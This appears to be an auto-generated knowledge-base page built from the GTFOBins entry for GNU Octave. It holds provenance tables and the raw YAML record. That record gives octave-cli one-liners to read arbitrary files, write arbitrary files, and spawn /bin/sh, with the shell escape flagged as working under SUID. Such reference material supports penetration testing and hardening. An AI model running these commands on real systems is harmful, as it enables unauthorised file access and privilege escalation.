---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# octave

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `octave` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/octave` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [octave](../../tools/linux/octave.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | octave |
| name | octave |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/octave/ |

## Preserved Source Material

```yaml
_body: ''
_name: octave
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/octave
comment: The payloads are compatible with GUI mode.
functions:
  file-read:
  - binary: false
    code: octave-cli --eval 'format none; fid = fopen("/path/to/input-file"); while(!feof(fid)); txt = fgetl(fid); disp(txt);
      endwhile; fclose(fid);'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  file-write:
  - binary: false
    code: octave-cli --eval 'fid = fopen("/path/to/output-file", "w"); fputs(fid, "DATA"); fclose(fid);'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  shell:
  - code: octave-cli --eval 'system("/bin/sh")'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
